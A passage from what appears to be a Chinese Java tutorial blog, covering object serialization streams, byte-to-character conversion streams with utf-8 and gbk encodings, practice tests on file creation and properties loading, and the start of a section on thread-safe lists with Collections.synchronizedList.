<h3 id="ObjectInputStream-对象流，字节流"><a href="#ObjectInputStream-对象流，字节流" class="headerlink" title="ObjectInputStream(对象流，字节流)"></a>ObjectInputStream(对象流，字节流)</h3><p>对象流就是我们将java对象进行序列化，存储在文件中，并可以通过对象流反序列化回来，要序列化的对象一定需要实现<code>Serializable</code>,其属性也需要实现，基本数据类型会自动变成包装类，而包装类是已经实现了的。</p>
<blockquote>
<p>序列化一个dog对象到文件中，并再反序列化回来</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">public void objectInputStream() throws IOException, InterruptedException, ClassNotFoundException &#123;
    &#x2F;&#x2F; FileOutputStream()  如果没有使用追加默认 会直接将文件清空
    ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;&#x2F;Users&#x2F;qinsicheng&#x2F;IdeaProjects&#x2F;IOStream&#x2F;com&#x2F;qinsicheng&#x2F;dog.dat&quot;));
    try &#123;
        objectOutputStream.writeObject(new dog(&quot;旺财&quot;,123));
        objectOutputStream.writeObject(1);
        System.out.println(&quot;输出成功&quot;);
    &#125; finally &#123;
        objectOutputStream.close();
    &#125;

    Thread.sleep(500);

    &#x2F;&#x2F; ObjectInputStream 在读取数据文件时候会判断 magic value，version value，来判断文件是否正确，如果不正确会爆出EOP错误
    ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;&#x2F;Users&#x2F;qinsicheng&#x2F;IdeaProjects&#x2F;IOStream&#x2F;com&#x2F;qinsicheng&#x2F;dog.dat&quot;));
    try &#123;
        Object o &#x3D; objectInputStream.readObject();
        System.out.println((dog)o);
        System.out.println(objectInputStream.readObject());
        System.out.println(&quot;读取成功&quot;);
    &#125; finally &#123;
        objectInputStream.close();
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="ObjectOutputStream-对象流，字节流"><a href="#ObjectOutputStream-对象流，字节流" class="headerlink" title="ObjectOutputStream(对象流，字节流)"></a>ObjectOutputStream(对象流，字节流)</h3><h3 id="InputStreamReader-转化流，字节流"><a href="#InputStreamReader-转化流，字节流" class="headerlink" title="InputStreamReader  (转化流，字节流)"></a>InputStreamReader  (转化流，字节流)</h3><blockquote>
<p>为什么需要转化流？</p>
</blockquote>
<p>因为字符编码问题，当我们使用BufferedReader读txt文件时，默认使用Utf-8编码，现在想用其他编码格式，就可以将字节流转为字符流，然后指定编码规则，其实字符流本身底层使用的还是字节流，只是针对字符内容做出了优化。</p>
<blockquote>
<p>字节流FileInputStream 包装成字节流InputStreamReader,对文件进行读取(按照 utf-8/gbk 格式),进而在包装成BufferedReader。</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">public void InputStreamReader() throws IOException &#123;
    &#x2F;&#x2F; 将字节流FileInputStream 包装成字符流 InputStreamReader，对文件进行读取（utf-8&#x2F;gbk格式）,进而包装成BufferedReader
    FileInputStream fileInputStream &#x3D; new FileInputStream(&quot;&#x2F;Users&#x2F;qinsicheng&#x2F;IdeaProjects&#x2F;IOStream&#x2F;com&#x2F;qinsicheng&#x2F;hello.txt&quot;);
    &#x2F;&#x2F; 底层默认使用的就是UTF-8  ，我们也可以使用gbk等
    InputStreamReader inputStreamReader &#x3D; new InputStreamReader(fileInputStream, &quot;utf-8&quot;);
    BufferedReader bufferedReader &#x3D; new BufferedReader(inputStreamReader);

    try &#123;
        String s &#x3D; bufferedReader.readLine();
        System.out.println(&quot;读取到的内容&#x3D;&quot;+s);
    &#125; catch (IOException e) &#123;
        throw new RuntimeException(e);
    &#125; finally &#123;
        bufferedReader.close();
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="OutputStreamWriter-转化流，字节流"><a href="#OutputStreamWriter-转化流，字节流" class="headerlink" title="OutputStreamWriter(转化流，字节流)"></a>OutputStreamWriter(转化流，字节流)</h3><blockquote>
<p>使用gbk编码输出文本</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">OutputStreamWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">OutputStreamWriter</span> outputStreamWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OutputStreamWriter</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">BufferedWriter</span> bufferedWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedWriter</span><span class="token punctuation">(</span>outputStreamWriter<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        bufferedWriter<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"hello Jvav 世界"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
        bufferedWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>序列化需要注意的点</p>
</blockquote>
<ol>
<li>读写顺序一定一致</li>
<li>序列化，反序列化对象，需要实现Serializable</li>
<li>序列化的类中加入 SerialVersionUID,提高版本的兼容性</li>
<li>序列化对象时，其属性也都必须实现序列化接口</li>
<li>序列化具有继承性</li>
</ol>
<h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><ol>
<li>创建文件，并写入内容</li>
<li>利用转化流，改变字符编码</li>
<li>读取properties文件，创建对象</li>
<li>将对象序列化</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"> <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">finalTest1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token comment">// 1. 判断磁盘是否有mytemp文件，如果没有就创建mytemp</span>
        <span class="token comment">// 创建文件前需要保证该路径是否存在，如果不存在应先创建对应的包</span>
        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/pack1/pack2/pack3/mytemp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">boolean</span> mkdirs <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getParentFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mkdirs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>mkdirs<span class="token operator">?</span><span class="token string">"创建前提包"</span><span class="token operator">:</span><span class="token string">"创建失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">boolean</span> newFile <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>newFile<span class="token operator">?</span><span class="token string">"成功创建"</span><span class="token operator">:</span><span class="token string">"创建失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 2. 如果该文件已经存在 则输出文件已经存在，请不要重复创建了</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"文件已经存在，请不要重复创建了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// 3. 在该文件中追加hello , world</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            fileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"hello,world"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"数据写入成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">finalTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token comment">// 1. 使用BufferedReader 读取一个文本文件 为每一行加一个句号，并输出到屏幕</span>
        <span class="token class-name">FileReader</span> fileReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BufferedReader</span> bufferedReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>fileReader<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> readLen<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>readLen <span class="token operator">=</span> bufferedReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 如果不加\n 默认换行只返回""，所有内容挤在一起</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>readLen<span class="token operator">+</span><span class="token string">".\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"输出结束"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            bufferedReader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// 2.如果文本是gbk模式 出现了乱码</span>
        <span class="token class-name">InputStreamReader</span> inputStreamReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BufferedReader</span> bufferedReader1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>inputStreamReader<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> readSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
<span class="token comment">//            while ((readSize = inputStreamReader.read(chars)) != -1) &#123;</span>
<span class="token comment">//                System.out.println(new String(chars,0,readSize));</span>
<span class="token comment">//            &#125;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>readLen<span class="token operator">=</span>bufferedReader1<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>readLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            bufferedReader1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">finalTest3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 编写一个dog.properties 含有：name，age</span>
        <span class="token comment">// 编写一个dog类，创建一个dog对象，并读取dog.properties相应的属性，并完成初始化。</span>
        <span class="token class-name">Properties</span> properties <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 这里需要注意 IDEA的properties文件默认使用的编码ISO-8859-1，要么改为utf-8，要么读的时候改变字符编码格式</span>
        <span class="token class-name">FileReader</span> fileReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/dog.properties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        properties<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>fileReader<span class="token punctuation">)</span><span class="token punctuation">;</span>
        properties<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 实例化dog对象</span>
        dog dog <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">dog</span><span class="token punctuation">(</span>properties<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>properties<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dog<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 关闭流</span>
        fileReader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 将dog对象序列化到dog.dat文件</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/dog.dat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>dog<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"输出成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>​    我们上面列举到的实例，只是针对本地文件读取，这个最简单的，而真正需要我们去运用的是在网络IO中。不过基础还是得先打好。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>IO流</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础</title>
    <url>//post/Java/Java%E5%9F%BA%E7%A1%80.html</url>
    <content><![CDATA[<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><blockquote>
<p>集合中线程安全的方案：</p>
<ol>
<li>Collections.synchronizedList(arrayList);</li>
<li>Vector</li>
<li>CopyOnWriteArrayList</li>
</ol>
</blockquote>
<h3 id="Collections-synchronizedList"><a href="#Collections-synchronizedList" class="headerlink" title="Collections.synchronizedList"></a>Collections.synchronizedList</h3><p>Collections.synchronizedList 使用了装饰者模式，将原本的List包装了一层，在调用List原本的方法时，通过多态进行加锁操作，这里我们注意：<strong>读写操作加锁，获取迭代器不加锁</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>mutex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>mutex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">></span></span> <span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> list<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Must be manually synched by user!</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token class-name">ListIterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">></span></span> <span class="token function">listIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> list<span class="token punctuation">.</span><span class="token function">listIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Must be manually synched by user</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token class-name">ListIterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">></span></span> <span class="token function">listIterator</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> list<span class="token punctuation">.</span><span class="token function">listIterator</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Must be manually synched by user</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>为什么在获取迭代器时不加锁，并且注释了<code>Must be manually synched by user</code>,也就是由使用者来保证线程安全</p>
</blockquote>
<p>这里我们用代码示例一下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">synchronizedList</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 创建两个线程，一个遍历列表，一个修改列表</span>
    <span class="token class-name">Thread</span> iteratorThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> iter <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 迭代过程中可能会抛出 ConcurrentModificationException</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Thread</span> updaterThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 确保迭代线程先启动</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 在迭代进行时删除元素</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    iteratorThread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    updaterThread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        iteratorThread<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        updaterThread<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
